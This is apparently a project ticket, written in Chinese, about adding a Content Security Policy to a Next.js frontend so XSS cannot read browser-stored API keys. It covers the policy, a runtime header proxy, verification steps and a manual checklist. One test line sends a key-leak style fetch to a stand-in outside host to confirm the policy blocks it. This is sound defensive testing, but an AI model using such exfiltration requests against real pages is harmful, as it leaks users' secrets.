# 08: 全站加 CSP

**What to build:** 自带密钥存在浏览器里以后，前端一旦出现 XSS，脚本就能读到 key。全站加一个务实版的 CSP：只允许加载本站的脚本、只允许向本站发请求，页面照旧静态渲染，落地页的首屏速度不受影响。严格的 nonce 版不做，原因见 ADR-0017。

**Blocked by:** None (can start immediately)

**Status:** done

- [x] Next 的全局响应头给所有页面加上 CSP，至少包括：`script-src 'self' 'unsafe-inline'; connect-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'`。其他指令（`default-src`、`img-src`、`media-src`、`font-src`、`worker-src` 等）按实际用到的来源补齐。
- [x] 页面的渲染方式不变：构建输出里原来是静态的页面，加了 CSP 以后仍然是静态的。
- [x] 逐项确认没有挡住正常功能：落地页（包括招呼的音频）、登录、对话页、立绘和 Spine、通话（WebRTC、TURN、通话提示音）、后台各页。
- [x] 票里写好人工验证清单：用构建版前端（`next build` 加 `next start`），实际打一通电话、发一个回合、打开落地页和后台，看浏览器控制台里没有被 CSP 挡掉的请求。

## Comments

### 实现（2026-10-10）

**跟票面不同的两处，都是立绘素材逼出来的：**

1. **`connect-src` 不只是 `'self'`**：立绘的衣装清单、Spine 文件（atlas、json、png）、缩略图和落地页的招呼音频都由浏览器直接从 `EIDOLON_STAND_ASSETS_URL`（对象存储/CDN）加载，衣装清单和预取用的是 `fetch`。所以这个地址的 origin 加进了 `connect-src`、`img-src`、`media-src`；`script-src` 仍只有 `'self' 'unsafe-inline'`。地址不是 http(s) 时不加。ADR-0017 已注明这个例外。
2. **不放在 `next.config` 的 `headers()` 里，改由 `src/proxy.ts` 在运行时加**：前端镜像在 CI 构建，`headers()` 构建时就定死，那时不知道部署的立绘地址。proxy 每次请求读 `process.env.EIDOLON_STAND_ASSETS_URL`。两个 compose 文件把这个变量传给了前端容器；`docs/deploy.md` 和三版 README 写明不用 docker 跑前端时要给前端也设上它。

完整的策略（`src/lib/contentSecurityPolicy.ts`）：

```
default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: <立绘>; media-src 'self' <立绘>; font-src 'self'; connect-src 'self' <立绘>; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'
```

matcher 除了 `/api/` 和 `/_next/` 都加。

**核对过的：**

- 静态渲染不变：加 CSP 前后 `prerender-manifest.json` 的静态路由完全一样（`/consent`、`/conversations`、`/login`、`/memories`、`/privacy`、`/settings`、`/terms` 等）。`/` 和 `/about` 本来就是动态的。构建版 `next start` 下这些页面照旧 `x-nextjs-cache: HIT`，响应头带着 CSP。
- 运行时读得到变量：不带变量构建，`next start` 时带 `EIDOLON_STAND_ASSETS_URL=https://stand.hmhnk.top`，响应头里有这个 origin。
- Playwright（构建版前端加本地后端，开发登录）逐页打开 `/`、`/about`、`/consent`、`/conversations`、`/conversation/mano`、`/settings`、`/memories`、`/privacy`、`/terms`：没有一条 `securitypolicyviolation`，控制台没有 CSP 报错。对话页从 CDN 取的衣装清单、atlas、png、json 都是 200；落地页招呼的 mp3 能 `canplay`。
- 确实拦得住：在设置页里 `fetch('https://example.com/?k=leak')` 被挡（`connect-src`），插入外站 `<script>` 被挡（`script-src-elem`）。
- 通话：麦克风用的是我们自己的 `Microphone`，不经过 pipecat 里用 blob 加 AudioWorklet 的 `WavRecorder`/`WavStreamPlayer`；WebRTC 和 TURN 不受 CSP 管。登录是链接跳转，表单都由 JS 提交，`form-action 'self'` 挡不到。
- **没能自动核对的**：后台各页（本地的管理者名单只有真实账号，开发登录进不去），以及真实的一通电话。下面的清单要人工做。

前端 vitest 540 条、类型检查、纪律检查都通过。

### 人工验证清单

用构建版前端（`npm run build`，然后 `BACKEND_URL=http://localhost:8000 EIDOLON_STAND_ASSETS_URL=<和 .env 一样> npm run start`），整个过程开着浏览器开发者工具的控制台，留意有没有 `Content Security Policy` / `Refused to …` 的报错：

1. 落地页：首屏正常；点一位偶像，招呼的语音能播、字幕出现；第 6 幕等动画照常。
2. 用 GitHub 或 Google 登录（真实账号）：跳转、回来、同意页都正常。
3. 发一个文字回合：流式回复、语音照常；有自带 LLM 的账号再发一个，确认照常、不计入限额。
4. 打一通电话：接通提示音、她的声音、你的声音都通；立绘出现、会动；换一套衣装，缩略图能显示、换上去正常；挂断提示音正常。手机网络（走 TURN）下再打一次更好。
5. 后台：看板、用户列表和详情、配置页、价格页逐个打开，图表和操作正常。
6. 部署到 VPS 后，在线上再看一遍 1 和 4（线上前端容器要拿到 `EIDOLON_STAND_ASSETS_URL`，compose 已经传了）。

### 人工验证通过（2026-10-10）

用户按上面的清单在本地构建版（带 `EIDOLON_STAND_ASSETS_URL`）逐项验证：落地页招呼、真实账号登录、文字回合、通话（立绘、换衣装、提示音）、后台各页，控制台没有被 CSP 挡掉的请求，全部正常。部署到 VPS 后线上那一项（清单第 6 条）随部署再看。
